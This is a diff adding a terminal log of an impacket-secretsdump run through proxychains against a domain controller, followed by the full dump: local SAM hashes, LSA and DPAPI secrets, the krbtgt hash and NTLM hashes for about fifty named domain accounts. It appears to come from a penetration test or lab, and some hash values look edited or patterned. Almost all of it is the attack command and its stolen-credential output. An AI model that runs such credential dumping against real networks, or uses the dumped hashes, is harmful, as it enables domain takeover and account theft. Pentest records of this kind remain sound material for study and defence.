@@ -1,0 +1,75 @@
+$ proxychains -q impacket-secretsdump -k -no-pass svinopsarnya.ru/administrator@10.11.11.11
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Target system bootKey: 0x3af54209cbd342af63195dd71254540b
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:f78459175491b2a92341237962a5431c:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+svinopsarnya\DC01$:aes256-cts-hmac-sha1-96:fc886bc32147989851a700ee1515462121b3026d9a9053452123542c324314e4
+svinopsarnya\DC01$:aes128-cts-hmac-sha1-96:23424185115411f13105342510d1514b
+svinopsarnya\DC01$:des-cbc-md5:352253423d04e441
+svinopsarnya\DC01$:aad3b435b51404eeaad3b435b51404ee:2342350e773d0da10543349e65241432:::
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0x54211532dcaa02345235d151614695b714511944
+dpapi_userkey:0x654259bd23450e806545612b05b34234de953547
+[*] NL$KM 
+NL$KM:e2454356542c51f45fda452a6492657420845b283f2c76357600d62342343940896d453a72346099234332648654c43455623432b6594042034d23c465423423
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:f23234234523b2a65428f6234324365c:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:730a24523421e65492d2342a6b54234d:::
+svinopsarnya.ru\backup:1103:aad3b435b51404eeaad3b435b51404ee:bd52354312348dd36524123426652234:::
+svinopsarnya.ru\agazanov:1104:aad3b435b51404eeaad3b435b51404ee:957c9126f9e6bad3856b8c360ee555ca:::
+svinopsarnya.ru\rnagavitsyn:1105:aad3b435b51404eeaad3b435b51404ee:0eaa3fefd75bec9f3bc3af28b6c014d8:::
+svinopsarnya.ru\ilorkina:1106:aad3b435b51404eeaad3b435b51404ee:af8650c08dfefe8aeffc90ae95e59bd2:::
+svinopsarnya.ru\abunov:1107:aad3b435b51404eeaad3b435b51404ee:ed235fda55d73e75b46bca4476663176:::
+svinopsarnya.ru\dkrupoderov:1108:aad3b435b51404eeaad3b435b51404ee:e6760eaf2cac12712df55a0f10a380d4:::
+svinopsarnya.ru\onosikov:1109:aad3b435b51404eeaad3b435b51404ee:b650cd51e8cbfd2a32ca3a0000c2dcca:::
+svinopsarnya.ru\lpohmelkin:1110:aad3b435b51404eeaad3b435b51404ee:09f3ae5884b152b60c27a2fcca239355:::
+svinopsarnya.ru\szhilkina:1111:aad3b435b51404eeaad3b435b51404ee:72c366e9d4e2c0972017d6d4aa212fe2:::
+svinopsarnya.ru\gundrov:1112:aad3b435b51404eeaad3b435b51404ee:c04fd29eafe2fb460ece98816d3471bc:::
+svinopsarnya.ru\kinahodova:1113:aad3b435b51404eeaad3b435b51404ee:70e13047e384f1852e3676a5bb26b4be:::
+svinopsarnya.ru\reminev:1114:aad3b435b51404eeaad3b435b51404ee:8f4bbc34c12465ecece29f88671bfee4:::
+svinopsarnya.ru\akavelenova:1115:aad3b435b51404eeaad3b435b51404ee:920edf983b8e25bb28171326ffd3fdaa:::
+svinopsarnya.ru\rgatavskiy:1116:aad3b435b51404eeaad3b435b51404ee:cb8ee26278cf7b35c59995d2136ff8b5:::
+svinopsarnya.ru\atubolova:1117:aad3b435b51404eeaad3b435b51404ee:37b994b236665c2353c5aacfbb712216:::
+svinopsarnya.ru\lfayzulina:1118:aad3b435b51404eeaad3b435b51404ee:8b047c70089ad46f77783c84211a4ce0:::
+svinopsarnya.ru\tbuykih:1119:aad3b435b51404eeaad3b435b51404ee:b17a58567f501da869efba11c5d4571d:::
+svinopsarnya.ru\lzakrasin:1120:aad3b435b51404eeaad3b435b51404ee:ffe0886821618c510b2a74598b1b22b1:::
+svinopsarnya.ru\ketova:1121:aad3b435b51404eeaad3b435b51404ee:4de180a3e5127a287805c088770baf4d:::
+svinopsarnya.ru\isergunova:1122:aad3b435b51404eeaad3b435b51404ee:3117e8047c455d32c83a1e5df6250176:::
+svinopsarnya.ru\iogolev:1123:aad3b435b51404eeaad3b435b51404ee:7f7f18602eea06888e7849693a9de503:::
+svinopsarnya.ru\asasonkin:1124:aad3b435b51404eeaad3b435b51404ee:6b3614d4d349c75b83844defe256d9d7:::
+svinopsarnya.ru\rvyvlokin:1125:aad3b435b51404eeaad3b435b51404ee:f013a9ec6c9b1c45b4dd8a6920c9b8a9:::
+svinopsarnya.ru\rblahova:1126:aad3b435b51404eeaad3b435b51404ee:20aee9a999483403ea8246df4e35e812:::
+svinopsarnya.ru\akopyrina:1127:aad3b435b51404eeaad3b435b51404ee:8e7a69bee42f1dcf831802ea8b36da90:::
+svinopsarnya.ru\vsiloginova:1128:aad3b435b51404eeaad3b435b51404ee:ab07dd466fe5e76d6763bd072023c069:::
+svinopsarnya.ru\tlavrichev:1129:aad3b435b51404eeaad3b435b51404ee:09526f296d7bef891c0c915184048856:::
+svinopsarnya.ru\yhamemolina:1130:aad3b435b51404eeaad3b435b51404ee:c1bd88856df4f56ceef058876a12a4cf:::
+svinopsarnya.ru\asigov:1131:aad3b435b51404eeaad3b435b51404ee:0206e61fc54e3947f7cb6930096cf974:::
+svinopsarnya.ru\kyrzitskaya:1132:aad3b435b51404eeaad3b435b51404ee:3f3bba1ec191bf1c9b55f9778cb15949:::
+svinopsarnya.ru\abratenkov:1133:aad3b435b51404eeaad3b435b51404ee:53b9d0c4d2466bee49865ff3f1675943:::
+svinopsarnya.ru\rbarmashin:1134:aad3b435b51404eeaad3b435b51404ee:577da59599b37e181a752c8d0c1819c9:::
+svinopsarnya.ru\aserdytskaya:1135:aad3b435b51404eeaad3b435b51404ee:3b948aa4b005fdeb93d29843c9a5998c:::
+svinopsarnya.ru\rvolgutov:1136:aad3b435b51404eeaad3b435b51404ee:4178c12f0ace0412a714e6d9d0d90cf1:::
+svinopsarnya.ru\aedunov:1137:aad3b435b51404eeaad3b435b51404ee:22cb09e4fd03fcfe98a1cb74aa0e0a67:::
+svinopsarnya.ru\abarsunova:1138:aad3b435b51404eeaad3b435b51404ee:9ee62c5b464893c7aa2b62470526dd8d:::
+svinopsarnya.ru\kdondokova:1139:aad3b435b51404eeaad3b435b51404ee:47851cbc262b06711f4c82cab82a48a8:::
+svinopsarnya.ru\uzapasov:1140:aad3b435b51404eeaad3b435b51404ee:91a23aa777eeae1705527ca1e53f49b7:::
+svinopsarnya.ru\abazvanov:1141:aad3b435b51404eeaad3b435b51404ee:67fd47767f5074c5c6e4f4282ee3bcb7:::
+svinopsarnya.ru\inakashkina:1142:aad3b435b51404eeaad3b435b51404ee:a6fff0be4b13138a1d7dc6be6b205520:::
+svinopsarnya.ru\idenitskiy:1143:aad3b435b51404eeaad3b435b51404ee:b90dc09056142c6643088a05c09e95ec:::
+svinopsarnya.ru\lmotricheva:1144:aad3b435b51404eeaad3b435b51404ee:ae0bb49702941a994df885cbbcf0c876:::
+svinopsarnya.ru\agnidchin:1145:aad3b435b51404eeaad3b435b51404ee:a7c1e84b8d01d61bc11a72388f90cd75:::
+svinopsarnya.ru\ksvindykova:1146:aad3b435b51404eeaad3b435b51404ee:6c259f1003faad896ead94418585c9e1:::
+svinopsarnya.ru\lfaradzhaeva:1147:aad3b435b51404eeaad3b435b51404ee:e9f29d8dfff06bc1ceedd332a11d468d:::
+svinopsarnya.ru\lrazhkov:1148:aad3b435b51404eeaad3b435b51404ee:71b0e40027524b0c93a5fd3bdce979fe:::
+svinopsarnya.ru\yvedeneev:1149:aad3b435b51404eeaad3b435b51404ee:8860f4a6d117774e76007375766f8535:::
+[*] Kerberos keys grabbed
+[*] Cleaning up...
